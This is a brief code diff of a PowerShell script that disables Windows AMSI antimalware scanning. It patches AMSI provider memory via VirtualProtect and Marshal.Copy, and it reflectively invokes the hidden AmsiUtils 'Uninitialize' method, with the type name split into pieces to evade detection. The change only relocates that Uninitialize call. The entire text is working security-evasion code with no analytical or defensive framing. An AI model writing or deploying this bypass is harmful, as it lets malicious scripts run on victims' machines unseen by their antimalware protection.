@@ -30,7 +30,8 @@ foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Na
     $p = 0
     [Win32]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
     [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
-    $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
-    $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
-    $Uninitialize.Invoke($object,$null)
 }
+
+$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
+$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
+$Uninitialize.Invoke($object,$null)
